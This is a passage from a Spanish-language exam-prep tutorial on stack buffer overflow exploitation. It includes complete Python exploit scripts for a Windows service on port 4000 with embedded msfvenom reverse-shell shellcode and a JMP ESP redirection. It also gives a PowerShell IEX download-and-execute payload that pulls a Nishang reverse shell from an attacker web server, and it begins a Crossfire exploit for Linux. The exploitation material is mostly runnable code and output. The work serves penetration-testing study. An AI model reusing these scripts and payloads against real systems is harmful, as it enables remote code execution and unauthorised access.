"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*809 + "B"*4 + badchars + "C"*(1300-809-4-255)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando bÃºffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexiÃ³n...\n"
  sys.exit(0)

```

Desde **Immunity Debugger**, tras la ejecuciÃ³n del script podremos ver una vez se produce el desbordamiento del bÃºfer los valores que estÃ¡n siendo depositados sobre el registro ESP, correspondiente a nuestros badchars. La idea aquÃ­ es caracter que no veamos, caracter que debemos desechar en el envÃ­o de nuestros badchars.

Generalmente, los caracteres **\x0a** y **\x0d** suelen ser badchars, pero pueden varÃ­an en funciÃ³n del servicio que estemos utilizando. Algo importante a tener en cuenta es el caracter **\x00**, badchar que por norma general no suele ser incluido de forma visual en la estructura de badchars, pues es genÃ©rico y siempre debe ser omitido a la hora de generar nuestro Shellcode.

Suponiendo que hemos detectado que los badchars para este caso son **\x00\x0a\x0d**, lo Ãºnico que nos queda ya es generar nuestro Shellcode. 

#### Generando el Shellcode

El shellcode que se generarÃ¡ a continuaciÃ³n, lo que nos harÃ¡ serÃ¡ entablar una conexiÃ³n TCP reversa contra el equipo. Para ello, seguimos la siguiente sintaxis:

```
$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e"
```
Una vez generado el shellcode, lo aÃ±adimos a nuestro script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "B"*4 + "\x90"*16 + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando bÃºffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexiÃ³n...\n"
  sys.exit(0)

```
La razÃ³n por la cual se han insertado los **NOP-sled** (\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el **Immunity Debugger** para analizar instrucciÃ³n a instrucciÃ³n cÃ³mo se va produciendo el proceso de decodificaciÃ³n, asÃ­ como probar a no insertar los NOP-sled a fin de corroborar como la ejecuciÃ³n de nuestro Shellcode no es funcional.

Ya teniendo todo esto hecho, lo Ãºnico que queda es encontrar una direcciÃ³n de salto al registro ESP.

#### Salto al ESP

Llegando casi al final, para redirigir el flujo del programa y conseguir una ejecuciÃ³n exitosa de nuestro Shellcode, dado que nuestro Shellcode se sitÃºa en el registro **ESP** por un lado y dado que tenemos el control del registro **EIP** por otro... la idea es hacer que el registro **EIP** apunte hacia el registro **ESP**.

Para ello, no es tan simple como especificar en _Little Endian_ la direcciÃ³n del registro **ESP**, pues no funcionarÃ¡. Lo que tendremos que hacer es lograr que el registro EIP apunte hacia una direcciÃ³n de la memoria con permisos de ejecuciÃ³n y **ASLR** desactivado donde se aplique una instrucciÃ³n de tipo '**jmp ESP**'. De esta forma, conseguiremos tras apuntar a dicha direcciÃ³n, que la siguiente instrucciÃ³n a realizar corresponda a los **NOP's** iniciales del registro **ESP** hasta llegar a nuestro **Shellcode**.

Para ello, lo que tendremos que hacer una vez sincronizados al proceso desde **Immunity Debugger**, es aplicar el siguiente comando en la lÃ­nea de comandos interactiva de la herramienta:

`!mona modules`

Una vez hecho, se nos listarÃ¡n un puÃ±ado de mÃ³dulos, de entre los cuales deberemos buscar cuÃ¡les no poseen mecanismos de protecciÃ³n y tienen el ASLR desactivado. Para la examinaciÃ³n del OSCP, siempre habrÃ¡ uno que reÃºna dichas condiciones.

Tras encontrar el mÃ³dulo, desde las pestaÃ±as superiores en **Immunity Debugger** (las letras iniciales), una de ellas nos permite visualizar si el campo _.text_ del mÃ³dulo en la memoria tiene permisos de ejecuciÃ³n, en caso de ser asÃ­, el mÃ³dulo seleccionado es un candidato perfecto.

La idea una vez teniendo el mÃ³dulo candidato, es ver en quÃ© porciÃ³n de la memoria se estÃ¡ aplicando un salto al registro ESP. Para realizar esta bÃºsqueda, analizamos el equivalente OPCode de la instrucciÃ³n haciendo uso para ello de la utilidad **nasm_shell.rb** de Metasploit:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm > jmp esp
00000000  FFE4              jmp esp
nasm >

```

Sabiendo que a nivel de OPCode, un '**jmp ESP**' figura como **FFE4**, podemos a continuaciÃ³n desde Mona en la lÃ­nea de comandos interactiva de **Immunity Debugger** realizar la siguiente consulta en la secciÃ³n de mÃ³dulos:

`find -s "\xff\xe4" -m modulo.dll`

Suponiendo que se trata de una dll el mÃ³dulo candidato que hemos encontrado. De manera inmediata, se nos datarÃ¡n un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya direcciÃ³n de memoria no posea badchars.

Haciendo doble-click en la misma, podremos ver desde la interfaz principal de **Immunity Debugger** como dicha direcciÃ³n equivale a un jmp ESP. A modo de ejemplo, suponiendo que la direcciÃ³n es **0x12131415**, se deberÃ­an de aplicar al script los siguientes cambios:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "\x15\x14\x13\x12" + "\x90"*16 + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando bÃºffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexiÃ³n...\n"
  sys.exit(0)

```

Consiguiendo asÃ­ que el registro **EIP** apunte a dicha direcciÃ³n donde posteriormente se aplica el salto al registro **ESP**.

Una manera mÃ¡s elegante y opcional de hacer las cosas es importando la siguiente librerÃ­a en el script:

```python
from struct import pack
```

La funcionalidad del **pack** nos permite poner en formato _Little Endian_ una direcciÃ³n pasada directamente sin tener que estar haciendo la conversiÃ³n manualmente. Para ello, se deberÃ­a adaptar el script a lo que se muestra a continuaciÃ³n:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket
from struct import pack

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "B"*4 + pack('<L', 0x12131415) + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando bÃºffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexiÃ³n...\n"
  sys.exit(0)

```

Podemos establecer **BreakPoints** desde Immunity Debugger en dicha direcciÃ³n (pulsando **F2** para ello sobre la direcciÃ³n), a fin de corroborar que se produce una detenciÃ³n en la ejecuciÃ³n del programa tras el registro **EIP** pasar por la direcciÃ³n **0x12131415**. En caso de ser asÃ­, esto quiere decir que todo ha sido configurado correctamente, donde de pulsar la tecla **F8** una vez alcanzado el breakpoint, vemos que la siguiente instrucciÃ³n a realizar corresponde al primer **NOP-sled** del registro **ESP**.

Ya con todo esto hecho, tras la ejecuciÃ³n del exploit teniendo una sesiÃ³n de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesiÃ³n, en caso de volver a ejecutar el script... no ganaremos mÃ¡s veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.


#### Mejorando el Exploit

De forma opcional, en caso de querer tras la ejecuciÃ³n del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo Ãºnico que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:

```
$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
```
De esta forma, variamos la funciÃ³n de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendrÃ¡ el mismo tamaÃ±o (351 bytes), lo Ãºnico que habrÃ¡ que hacer serÃ¡ sutituir el Shellcode por el nuevo generado desde msfvenom.

Tras su ejecuciÃ³n, se podrÃ¡ comprobar como independientemente del nÃºmero de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.

En caso de querer mejorar un pelÃ­n mÃ¡s nuestro script, contamos con otra vÃ­a de tratar los 16 **NOPs** que hemos insertado al principio del registro **ESP**. Se suele considerar mÃ¡s Ã³ptimo insertar al principio del registro **ESP** el siguiente Opcode en vez de los **NOPs**, seguidamente continuando con el Shellcode:

```bash
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > sub esp,0x10
00000000  83EC10            sub esp,byte +0x10
```

Insertamos al principio del registro **ESP** el Opcode "**\x83\xEC\x10**", continuando con el Shellcode. Se considera mÃ¡s Ã³ptimo, pues dicha instrucciÃ³n arrastra el **ESP** lo suficientemente lejos como para que se decodifique el Payload sin ser estropeado, similar al uso intencionado de los NOPs solo que evitando tener que insertar **NOPs** hasta que validemos manualmente que rule (calculando offsets). 

Lo bueno de esta tÃ©cnica a su vez es que siempre funciona (Â¿HabrÃ¡ que tener en cuenta los badchars?, habrÃ¡ que investigar).

#### Reduciendo el Size y Acceso por Powershell

En caso de que nuestro **Size** en el **ESP** antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un pequeÃ±o truco que obtuve haciendo pruebas para reducir el tamaÃ±o de nuestro Shellcode.

La idea para este caso, va a ser obtener una sesiÃ³n reversa TCP vÃ­a **Powershell** aprovechando la utilidad de **Nishang**, concretamente la utilidad **Invoke-PowerShellTcp.ps1**. Dado que resultarÃ­a tedioso transferir el script, posteriormente dar una instrucciÃ³n de importaciÃ³n y luego otra de invocaciÃ³n... lo que haremos serÃ¡ hacerlo todo de una, aÃ±adiendo en la Ãºltima lÃ­nea del script el siguiente contenido:

`Invoke-PowerShellTcp -Reverse -IPAddress nuestraIP -Port 443`

De esta forma, nos aprovecharemos de **msfvenom** para generar una sentencia como la siguiente:

```bash
$~ msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8000/PS.ps1')" -f c -a x86 --platform windows EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

Payload size: 299 bytes
Final size of c file: 1280 bytes
unsigned char buf[] = 
"\xd9\xcb\xbf\xbe\xfd\xc8\xaf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x45\x31\x7e\x17\x03\x7e\x17\x83\x50\x01\x2a\x5a\x50\x12\x29"
"\xa5\xa8\xe3\x4e\x2f\x4d\xd2\x4e\x4b\x06\x45\x7f\x1f\x4a\x6a"
"\xf4\x4d\x7e\xf9\x78\x5a\x71\x4a\x36\xbc\xbc\x4b\x6b\xfc\xdf"
"\xcf\x76\xd1\x3f\xf1\xb8\x24\x3e\x36\xa4\xc5\x12\xef\xa2\x78"
"\x82\x84\xff\x40\x29\xd6\xee\xc0\xce\xaf\x11\xe0\x41\xbb\x4b"
"\x22\x60\x68\xe0\x6b\x7a\x6d\xcd\x22\xf1\x45\xb9\xb4\xd3\x97"
"\x42\x1a\x1a\x18\xb1\x62\x5b\x9f\x2a\x11\x95\xe3\xd7\x22\x62"
"\x99\x03\xa6\x70\x39\xc7\x10\x5c\xbb\x04\xc6\x17\xb7\xe1\x8c"
"\x7f\xd4\xf4\x41\xf4\xe0\x7d\x64\xda\x60\xc5\x43\xfe\x29\x9d"
"\xea\xa7\x97\x70\x12\xb7\x77\x2c\xb6\xbc\x9a\x39\xcb\x9f\xf0"
"\xbc\x59\x9a\xb7\xbf\x61\xa4\xe7\xd7\x50\x2f\x68\xaf\x6c\xfa"
"\xcc\x4f\x8f\x2e\x39\xf8\x16\xbb\x80\x65\xa9\x16\xc6\x93\x2a"
"\x92\xb7\x67\x32\xd7\xb2\x2c\xf4\x04\xcf\x3d\x91\x2a\x7c\x3d"
"\xb0\x5a\xed\xb6\x5e\xe8\x82\x50\xc4\x60\x09\x81\x4f\x3d\x89"
"\xe9\x01\xd8\x5e\xc7\xd2\x40\xcb\x72\x8e\xf0\x2b\x33\x35\x8c"
"\x05\x9c\xd0\x0e\x19\x4e\x72\xab\xf3\xfa\xad\x1d\x68\x6c\xd9"
"\x0f\x1c\x1d\x44\xab\x8f\x95\xf4\x5a\x5e\x31\xd1\xbb\xf6\xc9"
"\x55\xb3\x3c\x1d\xb9\x02\x73\x56\xeb\x54\x5d\xa8\xdd\xa5\x9b"
"\xf0\x11\xf5\xeb\x2f\x02\xa6\x25\x40\xd1\x79\x1d\x89\x15";
```

Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor vÃ­a Python en el puerto 8000 (para que desde la mÃ¡quina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesiÃ³n de escucha vÃ­a Netcat por el puerto 443.

Inmediatamente tras ejecutar el script, veremos cÃ³mo se recibe un GET desde nuestro servidor web vÃ­a Python y cÃ³mo en cuestiÃ³n de segundos ganamos acceso al sistema vÃ­a Powershell.

Buffer Overflow Linux
===============================================================================================================================

Hasta donde yo se, no es comÃºn que caiga un _Buffer Overflow_ de Linux, pero por si las moscas, detallo el procedimiento usando como ejemplo el aplicativo **Crossfire**.

#### Fuzzing

Para esta primera parte, contamos con el siguiente POC:

```python
#!/usr/bin/python 

import socket 

host = "192.168.1.X" 

crash = "\x41" * 4379 

buffer = "\x11(setup sound " + crash + "\x90\x00#" 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

print "[*]Sending evil buffer..." 
s.connect((host,13327))
s.send(buffer)
data=s.recv(1024)
print data 
s.close()
print "[*]Payload Sent!" 
```

El recurso lo podemos encontrar en el siguiente [enlace](https://github.com/pranatdayal/pentesting-scripts/blob/master/crossfire-poc.py). Adaptamos un poco el exploit a nuestras necesidades:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print "\nUso: python" + sys.argv[0] + " <direccionIP>\n"
	sys.exit(0)

host = sys.argv[1]
port = 13327

crash = "\x41" * 4379 

buffer = "\x11(setup sound " + crash + "\x90\x00#" 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print "[*] Enviando buffer..." 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print "[*] Payload Enviado!" 
except:
	print "\nError conectando con el servicio...\n"
	sys.exit(0)
```

Para este caso, nos dan un PoC con el offset calculado. Curiosamente, para este caso si superamos el tamaÃ±o del buffer el programa crashearÃ¡ de otra forma, por lo que es importante mantener esta cifra fija y para cualquier operaciÃ³n que hagamos tener bien calculados los tamaÃ±os.

Para empezar, iniciamos **edb** con el programa corriendo, de la siguiente forma:

```bash
$~ edb --run /usr/games/crossfire/bin/crossfire
```

Pulsamos la tecla **F9** 2 veces y mandamos el buffer desde consola. Desde **edb**, podremos observar la siguiente respuesta:

```bash
The debugged application encountered a segmentation fault.
The address 0x41414141 does not appear to be mapped.
```

Lo cual estÃ¡ genial, pues estamos sobreescribiendo el registro EIP, tal y como podremos comprobar posteriormente desde la secciÃ³n _Registers_ del aplicativo. Llegados a este punto, calculamos el Offset a continuaciÃ³n a fin de corroborar si efectivamente podemos tomar el control del **EIP**, mandando para ello 4 bytes correspondientes al caracter _B_ posteriormente.

#### Calculando el Offset en Linux

El procedimiento realmente es el mismo que en Windows, sÃ³lo que lo referencio asÃ­ en el tÃ­tulo asÃ­ para que el enlace directo desde el Ãndice no de problemas.

Usaremos una vez mÃ¡s el **pattern_create** y el **pattern_offset** de Metasploit. Dado que conocemos que por el momento el valor con el que vamos a trabajar es _4379_, matendremos esta cifra fija, en caso contrario el programa recordemos que crashearÃ¡ de otra forma:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/BoF]
â””â”€â”€â•¼ #/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1B